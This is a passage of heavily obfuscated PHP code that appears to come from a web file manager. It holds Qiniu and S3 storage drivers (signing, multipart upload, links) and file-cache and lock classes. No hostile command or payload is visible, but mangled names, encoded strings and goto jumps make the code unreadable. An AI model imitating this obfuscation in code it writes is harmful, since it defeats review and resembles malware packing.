strlen($«¦„Äã) - 1, 1) == $°Îëåı[8] ? !0 : !1; $this->cacheMethodInfoSet($«¦„Äã, $¾ïÕ±, $€àİ»ç); if ($¾ïÕ±) { $šüù›á†[] = $«¦„Äã; continue; } $½â„¢¾Û[] = $‘…ªÛ—» ? $€àİ»ç : $«¦„Äã; } foreach ($“Ä”Íî• as $«¦„Äã) { if ($«¦„Äã == $Œ¥üå¯ ) { continue; } $šüù›á†[] = $«¦„Äã; $this->cacheMethodInfoSet($«¦„Äã, !0); } if ($ÏŠ¥ñÛ === $°Îëåı[12]) { break; } } $this->cacheMethodInfoSet($Ûì¿Ü¥³, !0); return array($°Îëåı[82] => $šüù›á†, $°Îëåı[83] => $½â„¢¾Û); } public function canRead($¯¼²ÎØµ) { return $this->exist($¯¼²ÎØµ) ? !0 : !1; } public function canWrite($ÂâÎ”õ) { return $this->exist($ÂâÎ”õ) ? !0 : !1; } public function getContent($ÉèÙÂ¨Ï) { return $this->fileSubstr($ÉèÙÂ¨Ï, 0, -1); } public function setContent($ôê‹úĞ, $óÃ¢úİ = '') { $ªÚÇÂèô = $this->tempFile($this->pathThis($ôê‹úĞ)); file_put_contents($ªÚÇÂèô, $óÃ¢úİ); if ($this->upload($ôê‹úĞ, $ªÚÇÂèô)) { $this->tempFileRemve($ªÚÇÂèô); return !0; } return !1; } public function refreshUrls($óİ½¯İ–) { $şâ´®†‰ =& $_SERVER[ĞÂ¤àÓï]; $äÜ·šÁö = array(); if (is_array($óİ½¯İ–)) { foreach ($óİ½¯İ– as $µêı„§Ş) { $äÜ·šÁö[] = $this->link($µêı„§Ş); } } else { $äÜ·šÁö[] = $this->link($óİ½¯İ–); } $©œÍÑÆÙ = new Qiniu\Cdn\CdnManager($this->auth); list($¸—é§·–, $ö†‘ãÊ) = $©œÍÑÆÙ->refreshUrls($äÜ·šÁö); if ($ö†‘ãÊ) { return !1; } return $¸—é§·–[$şâ´®†‰[1183]] == $şâ´®†‰[759] ? !0 : !1; } public function fileSubstr($Ä§ÙÈØ, $‘·×‚¡ş, $÷®®—Ş£) { $Ø÷È×¤€ =& $_SERVER[ĞÂ¤àÓï]; if (!($§¤å­‡ş = $this->link($Ä§ÙÈØ))) { return !1; } $¦§çş† = !1; if ($÷®®—Ş£ > 0) { $÷İñá—• = $‘·×‚¡ş + $÷®®—Ş£ - 1; $¦§çş† = array($Ø÷È×¤€[1442] . $‘·×‚¡ş . $Ø÷È×¤€[386] . $÷İñá—•); } $Ó°Ğ¸¢Î = url_request($§¤å­‡ş, $Ø÷È×¤€[230], !1, $¦§çş†); return $Ó°Ğ¸¢Î[$Ø÷È×¤€[749]] ? $Ó°Ğ¸¢Î[$Ø÷È×¤€[1203]] : !1; } public function upload($ÒÈ­á²—, $‘˜îË“Œ, $½îş¡Ø… = false, $Şñ“¨‹ = REPEAT_REPLACE) { $€¡‹ƒÙ = new Qiniu\Storage\UploadManager(); $ú¡µ¥ª = $this->auth->uploadToken($this->bucket, $ÒÈ­á²—); $‡•´ˆëî = get_file_mime(get_path_ext($‘˜îË“Œ)); list($ğ™å”¡Ğ, $“—“çØ°) = $€¡‹ƒÙ->putFile($ú¡µ¥ª, $ÒÈ­á²—, $‘˜îË“Œ, null, $‡•´ˆëî); return $“—“çØ° ? !1 : $this->getPathOuter($ÒÈ­á²—); } public function uploadFormData($˜¡àÍ«ğ, $Öì‡æÚâ = 3600) { return $this->uploadToken($˜¡àÍ«ğ, $Öì‡æÚâ); } public function multiUploadFormData($¥Òû•˜Ş, $î£„ô² = 3600) { return $this->uploadToken($¥Òû•˜Ş, $î£„ô²); } private function uploadToken($ñ¥î“û, $ù•º³í¯ = 3600) { $¾™€¬ÊÖ =& $_SERVER[ĞÂ¤àÓï]; $Ü‰ˆôƒ = $ù•º³í¯; $°î °•  = array($¾™€¬ÊÖ[1443] => $¾™€¬ÊÖ[1444]); $ª»åÀ¬· = $ñ¥î“û; $çî˜Â±Å = $this->auth->uploadToken($this->bucket, $ª»åÀ¬·, $Ü‰ˆôƒ, $°î °• , !0); $…ŠÓ’¾£ = empty($this->region) || $this->region == $¾™€¬ÊÖ[1445] ? $¾™€¬ÊÖ[12] : $¾™€¬ÊÖ[386] . $this->region; $¦Û‹èø = http_type() . "\72\x2f\x2f\x75\x70\x6c\157\141\144{$…ŠÓ’¾£}\56\161\x69\156\151\165\160\56\143\157\x6d\57"; return array($¾™€¬ÊÖ[1446] => $çî˜Â±Å, $¾™€¬ÊÖ[1447] => $¦Û‹èø); } public function download($¦“ş¬ˆ”, $ğî÷·¥¾) { $·Œã×·È = IO::getPathInner(IO::mkfile($ğî÷·¥¾)); if (!($õÄÊÏÊÇ = $this->link($¦“ş¬ˆ”))) { return !1; } $œÉø¾Ğ÷ = 0; $ğŒ”Õ› = 1024 * 200; $¤İØ£ä— = fopen($·Œã×·È, $_SERVER[ĞÂ¤àÓï][1448]); while (!0) { $êÔˆûï = $this->fileSubstr($¦“ş¬ˆ”, $œÉø¾Ğ÷, $ğŒ”Õ›); if ($êÔˆûï === !1) { return !1; } fwrite($¤İØ£ä—, $êÔˆûï); $œÉø¾Ğ÷ += $ğŒ”Õ›; if (strlen($êÔˆûï) < $ğŒ”Õ›) { break; } } fclose($¤İØ£ä—); return $ğî÷·¥¾; } public function link($Å¾óÁñĞ, $ß§°‡å = '') { if (!$this->isFile($Å¾óÁñĞ)) { return !1; } $…î¬çè = $this->getHost() . $_SERVER[ĞÂ¤àÓï][8] . $this->pathEncode($Å¾óÁñĞ) . $ß§°‡å; return $this->auth->privateDownloadUrl($…î¬çè, 3600 * 12); } public function fileOut($ÓŞÂÖÎÙ, $É¯½”‘ = false, $ØÈŸá§Ä = false, $Ò¸µ±…ï = '') { $ÎÁ¬ı‹¸ =& $_SERVER[ĞÂ¤àÓï]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÓŞÂÖÎÙ, $É¯½”‘, $ØÈŸá§Ä, $Ò¸µ±…ï); } if (!$ØÈŸá§Ä) { $ØÈŸá§Ä = $this->pathThis($ÓŞÂÖÎÙ); } $¡‘×›“Ö = $É¯½”‘ ? $ÎÁ¬ı‹¸[1449] . rawurlencode($ØÈŸá§Ä) : $ÎÁ¬ı‹¸[12]; $†ÊÌò§ = $this->link($ÓŞÂÖÎÙ, $¡‘×›“Ö); $this->fileOutLink($†ÊÌò§); } public function fileOutServer($†ıİó£â, $ÛçÒîù´ = false, $¼” èÅ­ = false, $£ïœ‰Š‚ = '') { parent::fileOut($†ıİó£â, $ÛçÒîù´, $¼” èÅ­, $£ïœ‰Š‚); } public function fileOutImage($ËÖ°†Í‚, $¼¹½Æ‰Ì = 250) { $’´°úö— = $this->link($ËÖ°†Í‚, $_SERVER[ĞÂ¤àÓï][1450] . $¼¹½Æ‰Ì); $this->fileOutLink($’´°úö—); } public function fileOutImageServer($‚¿²®»ğ, $ÃŸ“ø›‰ = 250) { parent::fileOutImage($‚¿²®»ğ, $ÃŸ“ø›‰); } public function hashMd5($¥­óùš) { $‚êË£Ü© =& $_SERVER[ĞÂ¤àÓï]; $ÆÈ³û¡Â = $this->objectMeta($¥­óùš); return isset($ÆÈ³û¡Â[$‚êË£Ü©[212]]) ? $ÆÈ³û¡Â[$‚êË£Ü©[212]] : !1; $Ìöˆ‹ = $this->link($¥­óùš, $‚êË£Ü©[1451]); } public function size($ı‡Æˆ) { $›©á©ÄÆ = $this->objectMeta($ı‡Æˆ); return $›©á©ÄÆ ? $›©á©ÄÆ[$_SERVER[ĞÂ¤àÓï][76]] : 0; } public function info($èúäà³Ğ) { if ($this->isFolder($èúäà³Ğ)) { return $this->folderInfo($èúäà³Ğ); } else { if ($this->isFile($èúäà³Ğ)) { return $this->fileInfo($èúäà³Ğ); } } return !1; } public function exist($™ò‚™») { return $this->isFile($™ò‚™») || $this->isFolder($™ò‚™»); } public function isFile($£èŞÚÂ) { return !$this->isFolder($£èŞÚÂ) && $this->objectMeta($£èŞÚÂ); } public function isFolder($ù§Êşªà) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][165], $ù§Êşªà); } protected function objectMeta($²ëÈŞõÑ) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][167], $²ëÈŞõÑ); } protected function _objectMeta($›ØÆÄƒÚ) { $·¥üôÍÓ =& $_SERVER[ĞÂ¤àÓï]; list($ºø†Ã·’, $Óä­²˜´) = $this->bucketManager->stat($this->bucket, $›ØÆÄƒÚ); if ($ºø†Ã·’) { $ºø†Ã·’[$·¥üôÍÓ[76]] = intval($ºø†Ã·’[$·¥üôÍÓ[1437]]); } return $ºø†Ã·’; } protected function _isFolder($ÏÊêÜ‚) { $Â£¨í‚ =& $_SERVER[ĞÂ¤àÓï]; if ($ÏÊêÜ‚ == $Â£¨í‚[12] || $ÏÊêÜ‚ == $Â£¨í‚[8]) { return !0; } list($²¾­¹ÅÌ, $»ĞêØÄØ) = $this->bucketManager->listFiles($this->bucket, trim($ÏÊêÜ‚, $Â£¨í‚[8]) . $Â£¨í‚[8], $Â£¨í‚[12], 1, $Â£¨í‚[8]); return !empty($²¾­¹ÅÌ[$Â£¨í‚[1440]]) || !empty($²¾­¹ÅÌ[$Â£¨í‚[1441]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($İÂÀ®ê†) { parent::__construct($İÂÀ®ê†); } public function uploadFormData($Í¯£¬ôû, $ç‡Ÿ¿Œ… = 3600) { $£½²ˆ¡ =& $_SERVER[ĞÂ¤àÓï]; $‡æ¼Öî = $£½²ˆ¡[198]; $¿°­§“Û = $£½²ˆ¡[1355]; $ùÛÄÒ›Õ = $£½²ˆ¡[62]; $¯Ë¤ìšØ = gmdate($£½²ˆ¡[1356]); $ÍÓÉ¥±Ò = gmdate($£½²ˆ¡[750]); $€ïÌç¥ = $£½²ˆ¡[1357]; $·ÂÔİ§÷ = $ç‡Ÿ¿Œ… . $£½²ˆ¡[12]; $´‰À»Ç = $£½²ˆ¡[1319]; $Ô§“¸¡ô = array($this->accessKey, $ÍÓÉ¥±Ò, $this->region, $ùÛÄÒ›Õ, $€ïÌç¥); $°œÅàœ = implode($£½²ˆ¡[8], $Ô§“¸¡ô); $¼ÏÚºš = array($£½²ˆ¡[1321] => gmdate($£½²ˆ¡[1320], strtotime($£½²ˆ¡[1358])), $£½²ˆ¡[1322] => array(array($£½²ˆ¡[1324] => $this->bucket), array($£½²ˆ¡[1323] => $‡æ¼Öî), array($£½²ˆ¡[1325], $£½²ˆ¡[1326], $£½²ˆ¡[12]), array($£½²ˆ¡[1325], $£½²ˆ¡[1359], $£½²ˆ¡[12]), array($£½²ˆ¡[1325], $£½²ˆ¡[1360], $£½²ˆ¡[12]), array($£½²ˆ¡[1327] => $´‰À»Ç), array($£½²ˆ¡[1361] => $°œÅàœ), array($£½²ˆ¡[1362] => $¿°­§“Û), array($£½²ˆ¡[1363] => $¯Ë¤ìšØ), array($£½²ˆ¡[1364] => $·ÂÔİ§÷))); $¯ğñ˜ó¯ = base64_encode(json_encode($¼ÏÚºš)); $âßŞïç· = hash_hmac($£½²ˆ¡[1365], $ÍÓÉ¥±Ò, $£½²ˆ¡[1366] . $this->secret, !0); $º«ïìİš = hash_hmac($£½²ˆ¡[1365], $this->region, $âßŞïç·, !0); $ÙÉŞé–· = hash_hmac($£½²ˆ¡[1365], $ùÛÄÒ›Õ, $º«ïìİš, !0); $ØšÏç¥ = hash_hmac($£½²ˆ¡[1365], $€ïÌç¥, $ÙÉŞé–·, !0); $ğ½Ñà£‘ = hash_hmac($£½²ˆ¡[1365], $¯ğñ˜ó¯, $ØšÏç¥); $©¤—éıÌ = array($£½²ˆ¡[215] => $£½²ˆ¡[12], $£½²ˆ¡[1367] => $£½²ˆ¡[12], $£½²ˆ¡[1323] => $‡æ¼Öî, $£½²ˆ¡[1327] => $´‰À»Ç, $£½²ˆ¡[1331] => $¯ğñ˜ó¯, $£½²ˆ¡[1368] => $°œÅàœ, $£½²ˆ¡[1369] => $¿°­§“Û, $£½²ˆ¡[1370] => $¯Ë¤ìšØ, $£½²ˆ¡[1371] => $·ÂÔİ§÷, $£½²ˆ¡[1372] => $ğ½Ñà£‘, $£½²ˆ¡[181] => $this->getHost()); return $©¤—éıÌ; } public function multiUploadFormData($“Õ™‚¬¯, $ğÖÔ™—Ó = 3600) { $×ÙÍ¡Ÿ£ =& $_SERVER[ĞÂ¤àÓï]; $˜œíá™¿ = gmdate($×ÙÍ¡Ÿ£[1452]); $ª‡¹ö“ = array(); $·®Âùõ® = $this->client->getUploadId($this->bucket, $“Õ™‚¬¯, $ª‡¹ö“); if (!$·®Âùõ®) { return !1; } return array($×ÙÍ¡Ÿ£[223] => $·®Âùõ®, $×ÙÍ¡Ÿ£[181] => $this->getHost() . $×ÙÍ¡Ÿ£[8] . $this->pathEncode($“Õ™‚¬¯), $×ÙÍ¡Ÿ£[224] => $˜œíá™¿, $×ÙÍ¡Ÿ£[94] => $“Õ™‚¬¯); } public function multiUploadAuthData($Ï„Ë¯¥†, $äÉáˆÙ‰ = array()) { $ñÊÛ×ºÚ =& $_SERVER[ĞÂ¤àÓï]; $¾üëú‹ú = isset($äÉáˆÙ‰[$ñÊÛ×ºÚ[174]]) ? $äÉáˆÙ‰[$ñÊÛ×ºÚ[174]] : $ñÊÛ×ºÚ[12]; $ÄşÕËøñ = $äÉáˆÙ‰[$ñÊÛ×ºÚ[94]]; unset($äÉáˆÙ‰[$ñÊÛ×ºÚ[94]]); if (isset($äÉáˆÙ‰[$ñÊÛ×ºÚ[225]])) { return $this->listUploadParts($ÄşÕËøñ, $äÉáˆÙ‰); } $öÁã¹÷« = array(); if (isset($äÉáˆÙ‰[$ñÊÛ×ºÚ[1453]])) { $öÁã¹÷«[$ñÊÛ×ºÚ[1454]] = $äÉáˆÙ‰[$ñÊÛ×ºÚ[1453]]; } $®ªüŒâË = explode($ñÊÛ×ºÚ[183], $this->getHost()); $¶ıĞá = array($ñÊÛ×ºÚ[1455] => $®ªüŒâË[1], $ñÊÛ×ºÚ[1456] => $ñÊÛ×ºÚ[12], $ñÊÛ×ºÚ[215] => $ñÊÛ×ºÚ[120], $ñÊÛ×ºÚ[1367] => $äÉáˆÙ‰[$ñÊÛ×ºÚ[76]]); $Ğ¬Öº‡ = $ñÊÛ×ºÚ[228]; $ä³ÂÑÕÓ = $ñÊÛ×ºÚ[8] . $this->pathEncode($ÄşÕËøñ) . $¾üëú‹ú; $¼¶ùˆÀ™ = $this->client->__getSignatureV4($öÁã¹÷«, $¶ıĞá, $Ğ¬Öº‡, $ä³ÂÑÕÓ); if (strpos($¾üëú‹ú, $ñÊÛ×ºÚ[227]) === 0) { if (isset($öÁã¹÷«[$ñÊÛ×ºÚ[1454]])) { $•›ÜÊà„ = $öÁã¹÷«[$ñÊÛ×ºÚ[1454]]; } else { if (isset($¼¶ùˆÀ™[$ñÊÛ×ºÚ[1454]])) { $•›ÜÊà„ = $¼¶ùˆÀ™[$ñÊÛ×ºÚ[1454]]; } else { $•›ÜÊà„ = hash($ñÊÛ×ºÚ[1365], $ñÊÛ×ºÚ[12]); } } return array($ñÊÛ×ºÚ[234] => $¼¶ùˆÀ™[$ñÊÛ×ºÚ[234]], $ñÊÛ×ºÚ[1454] => $•›ÜÊà„, $ñÊÛ×ºÚ[224] => $¼¶ùˆÀ™[$ñÊÛ×ºÚ[1457]]); } return $¼¶ùˆÀ™[$ñÊÛ×ºÚ[234]]; } public function listUploadParts($Ñ­õ±Î, $š¢±ã = array()) { $¢¨ş„ï‡ =& $_SERVER[ĞÂ¤àÓï]; $Ë ò¦É« = str_replace($¢¨ş„ï‡[235], $¢¨ş„ï‡[12], $š¢±ã[$¢¨ş„ï‡[174]]); $¼›À½İ = $this->client->listParts($this->bucket, $Ñ­õ±Î, $Ë ò¦É«); if (!$¼›À½İ) { return !1; } $Ñ–§¾Èù = $¢¨ş„ï‡[1458]; foreach ($¼›À½İ as $€£ËàÂ‘) { $Ñ–§¾Èù .= $¢¨ş„ï‡[1459] . "\x3c\x50\141\162\164\x4e\x75\155\142\145\x72\x3e{$€£ËàÂ‘[$¢¨ş„ï‡[1413]]}\x3c\57\120\x61\x72\164\116\x75\x6d\142\145\162\x3e\12" . "\74\x45\124\x61\147\x3e{$€£ËàÂ‘[$¢¨ş„ï‡[1414]]}\x3c\57\x45\x54\141\x67\76\xa" . $¢¨ş„ï‡[1460]; } $Ñ–§¾Èù .= $¢¨ş„ï‡[1461]; $ªæ½´ïÖ = array(); $¯¥¾—Ÿ¶ = explode($¢¨ş„ï‡[183], $this->getHost()); $î£ºÚÌ = array($¢¨ş„ï‡[1455] => $¯¥¾—Ÿ¶[1], $¢¨ş„ï‡[215] => $¢¨ş„ï‡[120], $¢¨ş„ï‡[1367] => strlen($Ñ–§¾Èù)); $ï¯‹Äêí = $¢¨ş„ï‡[226]; $•Îì¿ëß = $¢¨ş„ï‡[8] . $this->pathEncode($Ñ­õ±Î) . $š¢±ã[$¢¨ş„ï‡[174]]; $‘êßÉ¥ = $this->client->__getSignatureV4($ªæ½´ïÖ, $î£ºÚÌ, $ï¯‹Äêí, $•Îì¿ëß, $Ñ–§¾Èù); return array($¢¨ş„ï‡[234] => $‘êßÉ¥[$¢¨ş„ï‡[234]], $¢¨ş„ï‡[224] => $‘êßÉ¥[$¢¨ş„ï‡[1457]], $¢¨ş„ï‡[236] => $¼›À½İ, $¢¨ş„ï‡[1454] => $‘êßÉ¥[$¢¨ş„ï‡[1454]]); } public function link($öÇØò’¼, $¥‹¼ùçô = array()) { return parent::link($öÇØò’¼, $¥‹¼ùçô); } public function fileOut($Öñˆï†, $¾·§ùë = false, $Œé’‡­„ = false, $İ€€ö–’ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ĞÂ¤àÓï][1462])) { return parent::fileOutServer($Öñˆï†, $¾·§ùë, $Œé’‡­„, $İ€€ö–’); } parent::fileOut($Öñˆï†, $¾·§ùë, $Œé’‡­„, $İ€€ö–’); } public function fileOutImage($øáÃ³ƒä, $ÉÆ©¯§õ = 250) { if (strstr($this->endpoint, $_SERVER[ĞÂ¤àÓï][1462])) { return parent::fileOutImageServer($øáÃ³ƒä, $ÉÆ©¯§õ); } parent::fileOutImage($øáÃ³ƒä, $ÉÆ©¯§õ); } public function fileOutLink($Â¹ğ„Ş¸) { $œ­¥»²« =& $_SERVER[ĞÂ¤àÓï]; if (substr($Â¹ğ„Ş¸, 0, 7) == $œ­¥»²«[1334]) { $Â¹ğ„Ş¸ = $œ­¥»²«[1335] . substr($Â¹ğ„Ş¸, 7); } header($œ­¥»²«[161] . $Â¹ğ„Ş¸); die; } public function getHost() { $ŞèÄ±»¸ =& $_SERVER[ĞÂ¤àÓï]; $ªŸÛ«ç” = str_rtrim(parent::getHost(), $ŞèÄ±»¸[8] . $this->bucket); $ªŸÛ«ç” = explode($ŞèÄ±»¸[183], $ªŸÛ«ç”); return $ªŸÛ«ç”[0] . $ŞèÄ±»¸[183] . $this->bucket . $ŞèÄ±»¸[10] . $ªŸÛ«ç”[1]; } } goto Bƒ§Úºä¤; E¿ ô¢ŒëÄ: function binCheckBigger($³¦¶°±Ô, $ù“‘²Ëº) { return $³¦¶°±Ô > $ù“‘²Ëº; } $_SERVER[$_SERVER[ÚâÊšŒı][3]] = (strrev('1818')."\67\63")+0;$_157a="hsy7d4e189tpqcbrumg0wa5k2oxil36zjfvn347rlfdnp2j6x5e0qv9zy1tbsh8gmicaoukwg3yqu62b4i";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¬†»­©, $šÜ´¥‡À) { $§éÑÏ‹½ =& $_SERVER[ĞÂ¤àÓï]; if (isset(self::$_methodList[$¬†»­©])) { return @call_user_func_array(self::$_methodList[$¬†»­©], $šÜ´¥‡À); } else { if (method_exists($this, $¬†»­©)) { return call_user_func_array(array($this, $¬†»­©), $šÜ´¥‡À); } else { think_exception(__CLASS__ . $§éÑÏ‹½[4] . $¬†»­© . $§éÑÏ‹½[5]); } } } public static function __callStatic($ç÷ÍúÁÚ, $Í€÷†À) { if (isset(self::$_methodListStatic[$ç÷ÍúÁÚ])) { return call_user_func_array(self::$_methodListStatic[$ç÷ÍúÁÚ], $Í€÷†À); } else { if (method_exists(self, $ç÷ÍúÁÚ)) { return call_user_func_array(array(self, $ç÷ÍúÁÚ), $Í€÷†À); } else { show_json("{$ç÷ÍúÁÚ}\x28\x29\40\156\157\164\40\145\170\151\163\x74\73", !1); } } } public static function addMethod($šÜö½·Ó, $ìËˆÃ÷) { self::$_methodList[$šÜö½·Ó] = $ìËˆÃ÷; } public static function addMethodStatic($—ªÊÀ»Ç, $æ–Åş£å) { self::$_methodListStatic[$—ªÊÀ»Ç] = $æ–Åş£å; } } goto E¶µóÄå; fŒŠ“ğê¿¤: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($À§ˆà·, $íš½°¡†) { $”ãİñ™« =& $_SERVER[ĞÂ¤àÓï]; $this->cachePath = $À§ˆà·[$”ãİñ™«[84]]; $this->prefix = $”ãİñ™«[841]; $this->cacheTime = $íš½°¡†; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¸ø«–†) { $Æ¸²‹Ê =& $_SERVER[ĞÂ¤àÓï]; $¸ø«–† = str_replace(array($Æ¸²‹Ê[842], $Æ¸²‹Ê[97], $Æ¸²‹Ê[73]), $Æ¸²‹Ê[843], $¸ø«–†); return $this->cachePath . $Æ¸²‹Ê[844] . $¸ø«–† . $Æ¸²‹Ê[845]; } public function set($›ÉôŞè¯, $õ±ù§î¥, $ÖÅ¬ñÙ© = false) { $ÖÅ¬ñÙ© = $ÖÅ¬ñÙ© ? $ÖÅ¬ñÙ© : $this->cacheTime; $µ¾³ğ™× = $this->getFile($›ÉôŞè¯); if (file_put_contents($µ¾³ğ™×, $this->prefix . $õ±ù§î¥, LOCK_EX)) { @touch($µ¾³ğ™×, intval(time() + $ÖÅ¬ñÙ©)); clearstatcache(); return !0; } @unlink($µ¾³ğ™×); return !1; } public function get($÷üÎ¿Ä) { $òùÒóö = $this->getFile($÷üÎ¿Ä); if (file_exists($òùÒóö) && filemtime($òùÒóö) < time()) { @unlink($òùÒóö); return !1; } $Ú£µóŠ¬ = @file_get_contents($òùÒóö); return substr($Ú£µóŠ¬, strlen($this->prefix)); } public function remove($¿Ù¡Àº¶) { $­ç‰îÙ = $this->getFile($¿Ù¡Àº¶); return @unlink($­ç‰îÙ); } public function deleteAll() { $¥å«Œ— =& $_SERVER[ĞÂ¤àÓï]; $¨ÏØƒ = scandir($this->cachePath); foreach ($¨ÏØƒ as $ÜÃ³ÑÛ) { $ìª£öğ¤ = $this->cachePath . $ÜÃ³ÑÛ; if (strpos($ìª£öğ¤, $¥å«Œ—[845]) && strpos($ìª£öğ¤, $¥å«Œ—[846])) { @unlink($ìª£öğ¤); } } } public function clearTimeout() { $ÏªÏªÄß =& $_SERVER[ĞÂ¤àÓï]; $ÆßÛšõ‹ = scandir($this->cachePath); foreach ($ÆßÛšõ‹ as $®€Ú—¼Ú) { $‰ç°¹Çö = $this->cachePath . $®€Ú—¼Ú; if (strpos($‰ç°¹Çö, $ÏªÏªÄß[845]) && strpos($‰ç°¹Çö, $ÏªÏªÄß[846]) && filemtime($‰ç°¹Çö) < time()) { @unlink($‰ç°¹Çö); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Õ¨ºåœé =& $_SERVER[ĞÂ¤àÓï]; if (self::$handle) { return self::$handle; } $Œˆãğ¬ = $GLOBALS[$Õ¨ºåœé[6]][$Õ¨ºåœé[349]]; self::$timeout = $Œˆãğ¬[$Õ¨ºåœé[847]] ? $Œˆãğ¬[$Õ¨ºåœé[847]] : 10; $¿Ÿ™ÓÆ = _get($GLOBALS[$Õ¨ºåœé[6]], $Õ¨ºåœé[848]); $Ä¹¯«÷‹ = $Œˆãğ¬[$Õ¨ºåœé[834]] ? $Œˆãğ¬[$Õ¨ºåœé[834]] : $Õ¨ºåœé[199]; if ($Ä¹¯«÷‹ == $Õ¨ºåœé[21] && $¿Ÿ™ÓÆ == $Õ¨ºåœé[13]) { $Ä¹¯«÷‹ = $Õ¨ºåœé[199]; } switch ($Ä¹¯«÷‹) { case $Õ¨ºåœé[837]: self::$handle = new CacheLockRedis(); break; case $Õ¨ºåœé[838]: self::$handle = new CacheLockMemcached(); break; case $Õ¨ºåœé[21]: self::$handle = new CacheLockDatabase(); break; case $Õ¨ºåœé[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Õ¨ºåœé[849], $Õ¨ºåœé[850]); } return self::$handle; } private static function key($˜°§‘‚) { return $_SERVER[ĞÂ¤àÓï][851] . Cache::key($˜°§‘‚); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÎêÎÛåÃ = '') { self::$errorMsg = $ÎêÎÛåÃ; } public static function lockGlobal($ˆÑÓıíè, $¾¸Æ¾”™) { return self::lock($ˆÑÓıíè, $¾¸Æ¾”™, !0); } public static function lock($ç˜³®¾¦, $×ö¤¢Íì = false, $…óè¬ì = false) { $îÇÔäå— =& $_SERVER[ĞÂ¤àÓï]; $ú†¬¯Èı = self::init(); $Ãñü„ = self::key($ç˜³®¾¦); $×ö¤¢Íì = $×ö¤¢Íì ? $×ö¤¢Íì : self::$timeout; $…ÕÒÄº» = $ú†¬¯Èı->lock($Ãñü„, $×ö¤¢Íì); $ì‚İ³ã‰ = timeFloat(); if (!$…ÕÒÄº») { $İÁè… = "\154\x6f\143\x6b\40\x65\162\x72\x6f\x72\73\x6b\x65\x79\75{$ç˜³®¾¦}\73\164\151\x6d\x65\75{$×ö¤¢Íì}\73" . self::$errorMsg . $îÇÔäå—[71] . get_caller_msg(); $ˆ¥ØØè› = LNG($îÇÔäå—[852]) . "\x28{$×ö¤¢Íì}\163\51\x2e" . LNG($îÇÔäå—[853]); $ˆ¥ØØè› .= $îÇÔäå—[854]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ˆ¥ØØè› = $ˆ¥ØØè› . $îÇÔäå—[855] . self::$errorMsg; } write_log($İÁè…, $îÇÔäå—[850]); show_json($ˆ¥ØØè›, !1); } if (!$…óè¬ì) { self::$lockItem[$Ãñü„] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¡öÂ’÷š = number_format(timeFloat() - $ì‚İ³ã‰, 3); write_log($îÇÔäå—[856] . $ç˜³®¾¦ . $îÇÔäå—[857] . $¡öÂ’÷š, $îÇÔäå—[850]); } return $…ÕÒÄº»; } public static function lockGet($Š„½¹Ú) { $‡îĞßîß = self::key($Š„½¹Ú); if (self::$lockItem[$‡îĞßîß]) { return self::$lockItem[$‡îĞßîß]; } return self::init()->lockGet($‡îĞßîß); } public static function unlock($Ë¹à““Ó) { $ÖãÁì« =& $_SERVER[ĞÂ¤àÓï]; $şè½ïÚ´ = self::key($Ë¹à““Ó); self::$lockItem[$şè½ïÚ´] = null; self::init()->unlock($şè½ïÚ´); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÖãÁì«[858] . $Ë¹à““Ó, $ÖãÁì«[850]); } return; } public static function unlockRuntime() { $¼­§´öø =& $_SERVER[ĞÂ¤àÓï]; $‡Ñã¬¢€ = self::init(); $ã÷¯É”æ = !1; foreach (self::$lockItem as $•Ñ¯Ş¨ => $âŸâæ®“) { if (!$âŸâæ®“) { continue; } $‡Ñã¬¢€->unlock($•Ñ¯Ş¨); if (!$ã÷¯É”æ) { $ã÷¯É”æ = !0; write_log($¼­§´öø[859] . $•Ñ¯Ş¨ . $¼­§´öø[71] . get_caller_msg(), $¼­§´öø[850]); continue; } write_log($¼­§´öø[859] . $•Ñ¯Ş¨, $¼­§´öø[850]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $É¦¾Ø°÷ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¼­§´öø[860] . $É¦¾Ø°÷ . $¼­§´öø[861] . ACTION, $¼­§´öø[850]); } } public static function fileLock($Äİ«ƒäò) { $Ãêœò =& $_SERVER[ĞÂ¤àÓï]; if (!$GLOBALS[$Ãêœò[862]]) { $GLOBALS[$Ãêœò[862]] = array(); } $GLOBALS[$Ãêœò[862]][$Äİ«ƒäò] = !1; $õ¿æ©Âı = fopen(DATA_PATH . $Äİ«ƒäò . $Ãêœò[863], $Ãêœò[864]); if (!$õ¿æ©Âı) { return !1; } $GLOBALS[$Ãêœò[862]][$Äİ«ƒäò] = $õ¿æ©Âı; if (flock($õ¿æ©Âı, LOCK_EX)) { return !0; } self::unlock($Äİ«ƒäò); show_json($Ãêœò[865], !1); return !1; } public static function fileUnlock($¡¤Ô÷ËÍ) { $çÔôÒÓé =& $_SERVER[ĞÂ¤àÓï]; $µı‡İ°Ş = $GLOBALS[$çÔôÒÓé[862]][$¡¤Ô÷ËÍ]; if (!$µı‡İ°Ş) { return; } $GLOBALS[$çÔôÒÓé[862]][$¡¤Ô÷ËÍ] = !1; flock($µı‡İ°Ş, LOCK_UN); fclose($µı‡İ°Ş); } public static function fileUnlockAll() { $¨Æ³œÍå =& $_SERVER[ĞÂ¤àÓï]; if (!$GLOBALS[$¨Æ³œÍå[862]]) { return; } foreach ($GLOBALS[$¨Æ³œÍå[862]] as $ÎõÕùÆœ => $¨°á·Ô¸) { if (!$¨°á·Ô¸) { continue; } $GLOBALS[$¨Æ³œÍå[862]][$ÎõÕùÆœ] = !1; flock($¨°á·Ô¸, LOCK_UN); fclose($¨°á·Ô¸); } $GLOBALS[$¨Æ³œÍå[862]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 